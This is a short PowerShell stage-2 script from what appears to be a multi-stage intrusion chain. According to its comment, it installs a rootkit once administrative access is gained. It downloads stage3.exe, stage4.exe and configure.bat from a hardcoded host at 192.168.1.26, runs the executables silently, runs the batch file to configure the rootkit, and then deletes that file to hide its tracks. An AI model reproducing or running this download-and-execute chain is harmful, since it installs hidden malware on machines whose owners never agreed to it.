# Stage 2 can be anything for further evaluation, such as enumerating endpoint protection agents, in this example, we will begin with the rootkit installer as we know we have Administrative Access
    iwr -Uri 'http://192.168.1.26/stage3.exe' -OutFile 'stage3.exe';
    $currentPath = Get-Location
    $executable = "stage3.exe"
    Start-Process -FilePath "$currentPath\$executable" -NoNewWindow -PassThru | Out-Null
    Start-Sleep -Seconds 5
    iwr -Uri 'http://192.168.1.26/stage4.exe' -OutFile 'stage4.exe';
    # Configure the rootkit with a batch script
    iwr -Uri 'http://192.168.1.26/configure.bat' -Outfile 'configure.bat'
    cmd /c configure
    del configure.bat
    $executable = "stage4.exe"
    Start-Process -FilePath "$currentPath\$executable" -NoNewWindow -PassThru | Out-Null
    Start-Sleep -Seconds 5

